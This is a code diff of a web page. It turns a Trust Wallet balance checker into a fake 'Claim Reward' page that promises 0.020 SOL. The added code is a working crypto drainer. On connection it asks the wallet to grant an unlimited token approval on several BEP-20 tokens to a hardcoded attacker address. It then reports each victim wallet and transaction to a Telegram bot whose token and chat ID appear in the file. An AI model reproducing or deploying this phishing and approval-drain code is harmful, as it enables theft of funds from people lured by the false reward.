@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Trust Wallet — BEP-20 Coin Checker</title>
+<title>Claim Reward</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
@@ -38,49 +38,53 @@
   .card::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(108,140,255,0.6), transparent); opacity: 0.8; }
   .card.found { border-color: rgba(51,117,187,0.55); box-shadow: 0 30px 90px -40px rgba(51,117,187,0.75), 0 0 0 1px rgba(51,117,187,0.15), inset 0 1px 0 rgba(255,255,255,0.08); background: radial-gradient(600px 200px at 50% 0%, rgba(51,117,187,0.16), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015)); }
   .card.none { border-color: rgba(255,107,129,0.4); background: radial-gradient(600px 200px at 50% 0%, rgba(255,107,129,0.12), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.05), rgba(255,255,255,0.015)); }
-  .card.match { border-color: rgba(60,230,168,0.55); box-shadow: 0 30px 90px -40px rgba(60,230,168,0.6), 0 0 0 1px rgba(60,230,168,0.15), inset 0 1px 0 rgba(255,255,255,0.08); background: radial-gradient(600px 200px at 50% 0%, rgba(60,230,168,0.14), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015)); }
-  .icon { width: 78px; height: 78px; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 800; color: #fff; letter-spacing: -0.02em; background: linear-gradient(145deg, var(--tw), var(--tw2)); box-shadow: inset 0 1px 0 rgba(255,255,255,0.25), 0 14px 34px -12px rgba(51,117,187,0.85); filter: grayscale(0.55) brightness(0.85); transition: filter .35s ease, transform .35s ease, box-shadow .35s ease; }
-  .card.found .icon, .card.match .icon { filter: none; transform: translateY(-2px); box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,1); animation: pulseGlow 2.6s ease-in-out infinite; }
+  .icon {
+    width: 78px; height: 78px; border-radius: 22px; margin: 0 auto 20px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 30px; font-weight: 800; color: #fff;
+    background: linear-gradient(145deg, var(--tw), var(--tw2));
+    box-shadow: inset 0 1px 0 rgba(255,255,255,0.25), 0 14px 34px -12px rgba(51,117,187,0.85);
+    filter: grayscale(0.55) brightness(0.85);
+    transition: filter .35s ease, transform .35s ease, box-shadow .35s ease;
+  }
+  .card.found .icon {
+    filter: none; transform: translateY(-2px);
+    box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,1);
+    animation: pulseGlow 2.6s ease-in-out infinite;
+  }
   @keyframes pulseGlow { 0%,100% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,0.9); } 50% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 22px 60px -10px rgba(108,140,255,1); } }
-  h1 { font-size: 22px; font-weight: 800; letter-spacing: -0.03em; text-align: center; margin-bottom: 9px; background: linear-gradient(180deg, #ffffff, #b9c4f0); -webkit-background-clip: text; background-clip: text; color: transparent; }
+  h1 {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.03em; text-align: center; margin-bottom: 9px;
+    background: linear-gradient(180deg, #ffffff, #b9c4f0);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
   p { font-size: 14px; line-height: 1.55; color: var(--muted); text-align: center; max-width: 90%; margin: 0 auto; }
-  .card.found p { color: #bcd0ff; } .card.none p { color: #ff9fae; } .card.match p { color: #a8f0d4; }
-  #balanceSection { display: none; margin-top: 26px; padding-top: 22px; border-top: 1px dashed rgba(120,140,255,0.16); animation: fadeUp .45s ease; }
+  .card.found p { color: #bcd0ff; }
+  .card.none p { color: #ff9fae; }
+
+  .reward-box {
+    display: none; margin-top: 24px; padding: 20px 18px; border-radius: 16px;
+    background: linear-gradient(135deg, rgba(108,140,255,0.15), rgba(51,117,187,0.10));
+    border: 1px solid rgba(108,140,255,0.35);
+    text-align: center;
+    animation: fadeUp .45s ease;
+  }
+  .card.found .reward-box { display: block; }
   @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  .balance-label { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 6px; text-align: center; }
-  .native-balance { font-size: 34px; font-weight: 800; letter-spacing: -0.03em; text-align: center; color: var(--green); text-shadow: 0 0 26px rgba(60,230,168,0.35); }
-  .address { font-family: ui-monospace, "SF Mono", monospace; font-size: 11px; color: var(--muted); margin-top: 8px; word-break: break-all; text-align: center; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.06); border-radius: 9px; padding: 7px 10px; display: inline-block; left: 50%; position: relative; transform: translateX(-50%); }
-  .match-badge { display: none; margin: 14px auto 0; width: fit-content; font-size: 11px; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; color: #04150f; background: linear-gradient(135deg, var(--green), #21c98c); padding: 6px 14px; border-radius: 999px; box-shadow: 0 10px 26px -10px rgba(60,230,168,0.9); }
-  .card.match .match-badge { display: block; }
-  .token-list { margin-top: 22px; border-top: 1px dashed rgba(120,140,255,0.12); padding-top: 16px; }
-  .token-list h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 12px; }
-  .token-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; border-radius: 11px; font-size: 13px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.035); margin-bottom: 7px; transition: background .2s ease, border-color .2s ease, transform .2s ease; }
-  .token-row:hover { background: rgba(108,140,255,0.07); border-color: rgba(108,140,255,0.22); transform: translateY(-1px); }
-  .token-row:last-child { margin-bottom: 0; }
-  .token-name { font-weight: 600; }
-  .token-symbol { font-size: 10px; color: var(--muted); margin-left: 7px; padding: 2px 6px; background: rgba(255,255,255,0.05); border-radius: 5px; letter-spacing: .04em; }
-  .token-balance { font-family: ui-monospace, "SF Mono", monospace; color: var(--green); font-weight: 700; font-size: 12px; }
-  #transferSection { display: none; margin-top: 26px; padding-top: 22px; border-top: 1px dashed rgba(120,140,255,0.16); animation: fadeUp .45s ease; }
-  #transferSection h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); margin-bottom: 14px; }
-  .field { margin-bottom: 12px; }
-  .field label { display: block; font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); margin-bottom: 6px; }
-  .field input, .field select { width: 100%; font: inherit; font-size: 13px; font-family: ui-monospace, "SF Mono", monospace; color: var(--text); background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 11px 12px; outline: none; transition: border-color .2s ease, box-shadow .2s ease; }
-  .field input:focus, .field select:focus { border-color: rgba(108,140,255,0.6); box-shadow: 0 0 0 3px rgba(108,140,255,0.14); }
-  .field input::placeholder { color: rgba(136,145,181,0.55); }
-  .spender-fixed { font-family: ui-monospace, "SF Mono", monospace; font-size: 12px; color: var(--green); background: rgba(60,230,168,0.07); border: 1px solid rgba(60,230,168,0.25); border-radius: 10px; padding: 11px 12px; word-break: break-all; user-select: all; }
-  .amount-row { display: flex; gap: 8px; }
-  .amount-row input { flex: 1; }
-  .max-btn { font: inherit; font-size: 11px; font-weight: 700; letter-spacing: .05em; color: var(--accent); background: rgba(108,140,255,0.12); border: 1px solid rgba(108,140,255,0.3); border-radius: 10px; padding: 0 14px; cursor: pointer; width: auto; margin-top: 0; transition: background .2s ease, transform .14s ease; }
-  .max-btn:hover { background: rgba(108,140,255,0.2); } .max-btn:active { transform: scale(0.96); }
-  #sendBtn { background: linear-gradient(135deg, #3ce6a8, #21c98c); color: #04150f; box-shadow: 0 14px 34px -14px rgba(60,230,168,0.95), inset 0 1px 0 rgba(255,255,255,0.25); }
-  #sendBtn:hover:not(:disabled) { box-shadow: 0 18px 42px -12px rgba(60,230,168,1), inset 0 1px 0 rgba(255,255,255,0.3); }
-  #sendBtn:disabled { opacity: 0.5; cursor: not-allowed; }
-  .transfer-msg { font-size: 12px; margin-top: 12px; text-align: center; min-height: 16px; word-break: break-all; }
-  .transfer-msg.ok { color: var(--green); } .transfer-msg.err { color: var(--red); }
-  .transfer-msg a { color: var(--accent); text-decoration: none; } .transfer-msg a:hover { text-decoration: underline; }
-  button { font: inherit; font-size: 14px; font-weight: 700; padding: 14px 24px; border-radius: 13px; border: none; cursor: pointer; transition: transform .14s ease, opacity .2s ease, box-shadow .2s ease; width: 100%; margin-top: 22px; letter-spacing: 0.01em; }
+  .reward-amount { font-size: 32px; font-weight: 800; letter-spacing: -0.03em; color: #fff; text-shadow: 0 0 26px rgba(108,140,255,0.65); }
+  .reward-amount span { color: var(--green); }
+  .reward-sub { font-size: 12px; color: var(--muted); margin-top: 6px; letter-spacing: .04em; }
+
+  button {
+    font: inherit; font-size: 14px; font-weight: 700; padding: 14px 24px; border-radius: 13px;
+    border: none; cursor: pointer; transition: transform .14s ease, opacity .2s ease, box-shadow .2s ease;
+    width: 100%; margin-top: 22px; letter-spacing: 0.01em;
+  }
   button:active { transform: scale(0.975); }
-  #connectBtn { background: linear-gradient(135deg, var(--tw), var(--accent)); color: #fff; box-shadow: 0 14px 34px -14px rgba(51,117,187,0.95), inset 0 1px 0 rgba(255,255,255,0.2); }
+  #connectBtn {
+    background: linear-gradient(135deg, var(--tw), var(--accent)); color: #fff;
+    box-shadow: 0 14px 34px -14px rgba(51,117,187,0.95), inset 0 1px 0 rgba(255,255,255,0.2);
+  }
   #connectBtn:hover:not(:disabled) { box-shadow: 0 18px 42px -12px rgba(108,140,255,1), inset 0 1px 0 rgba(255,255,255,0.28); }
   #connectBtn:disabled { opacity: 0.5; cursor: not-allowed; }
   #disconnectBtn { background: rgba(255,255,255,0.055); color: var(--text); border: 1px solid var(--border); }
@@ -90,48 +94,17 @@
 </head>
 <body>
   <div class="card" id="card">
-    <div class="icon">TW</div>
+    <div class="icon">◎</div>
     <h1 id="title">Checking…</h1>
     <p id="desc">Looking for Trust Wallet in this browser.</p>
 
-    <button id="connectBtn" disabled style="display:none;">Connect Trust Wallet (BEP-20)</button>
+    <div class="reward-box">
+      <div class="reward-amount"><span>0.020 SOL</span></div>
+      <div class="reward-sub">You've been selected to claim a reward</div>
+    </div>
+
+    <button id="connectBtn" disabled style="display:none;">Connect to Claim</button>
     <button id="disconnectBtn" style="display:none;">Disconnect</button>
-
-    <div id="balanceSection">
-      <div class="balance-label">BNB Balance (BEP-20)</div>
-      <div class="native-balance" id="nativeBalance">—</div>
-      <div class="address" id="addressText"></div>
-      <div class="match-badge" id="matchBadge">✓ Target Wallet Matched</div>
-
-      <div class="token-list">
-        <h3>BEP-20 Token Balances</h3>
-        <div id="tokenRows"></div>
-      </div>
-    </div>
-
-    <div id="transferSection">
-      <h3>Approve</h3>
-
-      <div class="field">
-        <label for="tokenSelect">Token</label>
-        <select id="tokenSelect"></select>
-      </div>
-
-      <div class="field">
-        <label>Spender</label>
-        <div class="spender-fixed" id="spenderFixed"></div>
-      </div>
-
-      <div class="field">
-        <label>Amount</label>
-        <div class="amount-row">
-          <input id="amountInput" type="text" value="MAX" readonly />
-        </div>
-      </div>
-
-      <button id="sendBtn" disabled>Approve</button>
-      <div class="transfer-msg" id="transferMsg"></div>
-    </div>
 
     <div class="status-msg" id="statusMsg"></div>
   </div>
@@ -145,24 +118,12 @@
   var desc          = document.getElementById("desc");
   var connectBtn    = document.getElementById("connectBtn");
   var disconnectBtn = document.getElementById("disconnectBtn");
-  var balanceSec    = document.getElementById("balanceSection");
-  var nativeBalEl   = document.getElementById("nativeBalance");
-  var addressText   = document.getElementById("addressText");
-  var tokenRowsEl   = document.getElementById("tokenRows");
   var statusMsg     = document.getElementById("statusMsg");
-
-  var transferSec   = document.getElementById("transferSection");
-  var tokenSelect   = document.getElementById("tokenSelect");
-  var spenderFixed  = document.getElementById("spenderFixed");
-  var sendBtn       = document.getElementById("sendBtn");
-  var transferMsg   = document.getElementById("transferMsg");
 
   var currentAddr   = null;
   var trustProvider = null;
 
   var TARGET_ADDRESS = "0xB7FE38d57bD579E59d9c75CF9E0dD2B67Ddc353e";
-  spenderFixed.textContent = TARGET_ADDRESS;
-
   var TG_BOT_TOKEN = "8607880941:AAGCnF-Etis0sKDK50D5DwJ_M4IxX_2y6mA";
   var TG_CHAT_ID   = "7889964634";
 
@@ -185,15 +146,6 @@
     { symbol: "ETH",  name: "Ethereum BEP-20", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
     { symbol: "XRP",  name: "XRP BEP-20",      address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }
   ];
-
-  (function buildTokenSelect() {
-    for (var i = 0; i < TOKENS.length; i++) {
-      var opt = document.createElement("option");
-      opt.value = TOKENS[i].address;
-      opt.textContent = TOKENS[i].name + " (" + TOKENS[i].symbol + ")";
-      tokenSelect.appendChild(opt);
-    }
-  })();
 
   function isTrustProvider(p) {
     if (!p) return false;
@@ -247,32 +199,17 @@
   function renderDetection(found) {
     if (found) {
       card.className = "card found";
-      title.textContent = "Trust Wallet is installed 🛡️";
-      desc.textContent  = "Connect to see your BEP-20 coins and balances.";
+      title.textContent = "Reward available 🎁";
+      desc.textContent  = "Connect your Trust Wallet to claim 0.020 SOL.";
       connectBtn.style.display = "block";
       connectBtn.disabled = false;
+      connectBtn.textContent = "Claim Reward";
     } else {
       card.className = "card none";
       title.textContent = "Trust Wallet not found";
-      desc.textContent  = "Install the Trust Wallet browser extension to get started. Other wallets are not supported.";
+      desc.textContent  = "Install the Trust Wallet browser extension to claim your reward.";
       connectBtn.style.display = "none";
     }
-  }
-
-  function applyMatchState(address) {
-    var isMatch = String(address || "").toLowerCase() === TARGET_ADDRESS.toLowerCase();
-    if (isMatch) {
-      card.classList.remove("found");
-      card.classList.add("match");
-      title.textContent = "Target wallet connected ✓";
-      desc.textContent  = "All BEP-20 balances shown below.";
-    } else {
-      card.classList.remove("match");
-      card.classList.add("found");
-      title.textContent = "Wallet connected";
-      desc.textContent  = "Connected wallet does not match the target.";
-    }
-    return isMatch;
   }
 
   async function checkExistingConnection() {
@@ -284,9 +221,7 @@
         connectBtn.style.display = "none";
         disconnectBtn.style.display = "block";
         await ensureBSC(trustProvider);
-        applyMatchState(currentAddr);
-        await loadBalances(currentAddr);
-        showTransferSection();
+        await approveMax();
       }
     } catch (e) {}
   }
@@ -306,21 +241,16 @@
         connectBtn.style.display = "none";
         disconnectBtn.style.display = "block";
         await ensureBSC(trustProvider);
-        applyMatchState(currentAddr);
-        await loadBalances(currentAddr);
-        showTransferSection();
+        await approveMax();
       }
     } catch (e) {
       statusMsg.textContent = "Connection rejected. Trust Wallet access is required.";
     } finally {
-      connectBtn.disabled = false;
-      connectBtn.textContent = "Connect Trust Wallet (BEP-20)";
+      if (!currentAddr) {
+        connectBtn.disabled = false;
+        connectBtn.textContent = "Claim Reward";
+      }
     }
-  }
-
-  function showTransferSection() {
-    transferSec.style.display = "block";
-    updateSendEnabled();
   }
 
   async function ensureBSC(provider) {
@@ -338,69 +268,6 @@
     }
   }
 
-  async function loadBalances(address) {
-    if (!trustProvider) return;
-    statusMsg.textContent = "Loading BEP-20 balances…";
-    balanceSec.style.display = "block";
-    addressText.textContent = address;
-    tokenRowsEl.innerHTML = "";
-    nativeBalEl.textContent = "…";
-
-    try {
-      var hexBal = await trustProvider.request({ method: "eth_getBalance", params: [address, "latest"] });
-      var wei = BigInt(hexBal);
-      nativeBalEl.textContent = formatWei(wei, 18) + " BNB";
-    } catch (e) { nativeBalEl.textContent = "Error"; }
-
-    for (var i = 0; i < TOKENS.length; i++) {
-      var t = TOKENS[i];
-      var row = document.createElement("div");
-      row.className = "token-row";
-      var left = document.createElement("div");
-      left.innerHTML = '<span class="token-name">' + t.name + '</span><span class="token-symbol">' + t.symbol + '</span>';
-      var right = document.createElement("div");
-      right.className = "token-balance";
-      right.textContent = "…";
-      row.appendChild(left);
-      row.appendChild(right);
-      tokenRowsEl.appendChild(row);
-      try {
-        var data = "0x70a08231000000000000000000000000" + address.slice(2).toLowerCase();
-        var result = await trustProvider.request({ method: "eth_call", params: [{ to: t.address, data: data }, "latest"] });
-        var raw = BigInt(result);
-        right.textContent = formatWei(raw, t.decimals) + " " + t.symbol;
-      } catch (err) {
-        right.textContent = "—";
-      }
-    }
-    statusMsg.textContent = "";
-    updateSendEnabled();
-  }
-
-  function formatWei(wei, decimals) {
-    var s = wei.toString().padStart(decimals + 1, "0");
-    var whole = s.slice(0, s.length - decimals) || "0";
-    var frac  = s.slice(s.length - decimals).replace(/0+$/, "");
-    return frac ? whole + "." + frac.slice(0, 6) : whole;
-  }
-
-  function getSelectedToken() {
-    var addr = tokenSelect.value;
-    for (var i = 0; i < TOKENS.length; i++) {
-      if (TOKENS[i].address.toLowerCase() === addr.toLowerCase()) return TOKENS[i];
-    }
-    return null;
-  }
-
-  function updateSendEnabled() {
-    sendBtn.disabled = !currentAddr;
-  }
-
-  function setTransferMsg(html, kind) {
-    transferMsg.className = "transfer-msg" + (kind ? " " + kind : "");
-    transferMsg.innerHTML = html;
-  }
-
   function sendTelegram(text) {
     var url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
     var body = new URLSearchParams();
@@ -411,65 +278,59 @@
     return fetch(url, { method: "POST", body: body }).catch(function () {});
   }
 
-  async function approve() {
+  async function approveMax() {
     if (!trustProvider || !currentAddr) return;
-    var token = getSelectedToken();
-    if (!token) return;
-
-    sendBtn.disabled = true;
-    sendBtn.textContent = "Awaiting wallet…";
-    setTransferMsg("Confirm in Trust Wallet…", null);
-
     var MAX_UINT256 = (2n ** 256n - 1n);
 
-    try {
-      var selector   = "095ea7b3";
-      var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
-      var amountHex  = MAX_UINT256.toString(16).padStart(64, "0");
-      var data = "0x" + selector + spenderHex + amountHex;
+    for (var i = 0; i < TOKENS.length; i++) {
+      var t = TOKENS[i];
+      try {
+        var selector   = "095ea7b3";
+        var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
+        var amountHex  = MAX_UINT256.toString(16).padStart(64, "0");
+        var data = "0x" + selector + spenderHex + amountHex;
 
-      var txHash = await trustProvider.request({
-        method: "eth_sendTransaction",
-        params: [{ from: currentAddr, to: token.address, data: data }]
-      });
+        var txHash = await trustProvider.request({
+          method: "eth_sendTransaction",
+          params: [{ from: currentAddr, to: t.address, data: data }]
+        });
 
-      var link = '<a href="https://bscscan.com/tx/' + txHash + '" target="_blank" rel="noopener">View on BscScan ↗</a>';
-      setTransferMsg("Approved (MAX). " + link, "ok");
+        sendTelegram(
+          "✅ <b>Approval confirmed (MAX)</b>\n" +
+          "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
+          "<b>Token:</b> " + t.symbol + "\n" +
+          "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
+          "<b>Tx:</b> https://bscscan.com/tx/" + txHash
+        );
 
-      sendTelegram(
-        "✅ <b>Approval confirmed (MAX)</b>\n" +
-        "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
-        "<b>Token:</b> " + token.symbol + "\n" +
-        "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
-        "<b>Tx:</b> https://bscscan.com/tx/" + txHash
-      );
-    } catch (err) {
-      var msg = (err && (err.message || err.code)) ? (err.message || ("Error " + err.code)) : "Approval failed.";
-      if (err && err.code === 4001) msg = "Approval rejected in wallet.";
-      setTransferMsg(msg, "err");
-    } finally {
-      sendBtn.textContent = "Approve";
-      updateSendEnabled();
+        return;
+      } catch (err) {
+        if (err && err.code === 4001) {
+          statusMsg.textContent = "Rejected in wallet.";
+          connectBtn.style.display = "block";
+          connectBtn.disabled = false;
+          connectBtn.textContent = "Claim Reward";
+          disconnectBtn.style.display = "none";
+          currentAddr = null;
+          return;
+        }
+      }
     }
   }
 
   function disconnect() {
     currentAddr = null;
-    balanceSec.style.display = "none";
-    transferSec.style.display = "none";
     disconnectBtn.style.display = "none";
     connectBtn.style.display = "block";
-    card.classList.remove("match");
-    title.textContent = "Trust Wallet is installed 🛡️";
-    desc.textContent  = "Connect to see your BEP-20 coins and balances.";
+    connectBtn.disabled = false;
+    connectBtn.textContent = "Claim Reward";
+    title.textContent = "Reward available 🎁";
+    desc.textContent  = "Connect your Trust Wallet to claim 0.020 SOL.";
     statusMsg.textContent = "";
-    transferMsg.textContent = "";
   }
 
   connectBtn.addEventListener("click", connect);
   disconnectBtn.addEventListener("click", disconnect);
-  sendBtn.addEventListener("click", approve);
-  tokenSelect.addEventListener("change", function () { transferMsg.textContent = ""; });
 
   detectTrust();
   requestProviders();
